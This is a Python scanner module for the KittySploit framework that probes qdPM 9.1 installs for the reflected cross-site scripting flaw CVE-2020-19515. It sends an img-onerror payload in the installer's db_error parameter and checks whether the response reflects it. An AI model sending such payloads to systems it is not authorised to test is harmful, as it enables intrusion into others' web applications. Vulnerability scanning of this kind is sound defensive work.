#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""qdPM V9."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'qdPM 9.1 - Cross-site Scripting Detection',
        'description': 'qdPM V9.1 is vulnerable to Cross Site Scripting (XSS) via qdPM\\install\\modules\\database_config.php.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'xss', 'qdpm', 'unauth', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://topsecalphalab.github.io/CVE/qdPM9.1-Installer-Cross-Site-Scripting',
            'http://qdpm.net/download-qdpm-free-project-management',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-19515',
        ],
        'cve': 'CVE-2020-19515',
    }

    def run(self):
        r = self.http_request(method="GET", path='/install/index.php?step=database_config&db_error=<img%20src=x%20onerror=alert(document.domain)%20/>', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('<img src=x onerror=alert(document.domain) />', 'qdPM',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="qdPM 9.1 - Cross-site Scripting detected",
                path='/install/index.php?step=database_config&db_error=<img%20src=x%20onerror=alert(document.domain)%20/>',
            )
            return True
        return False

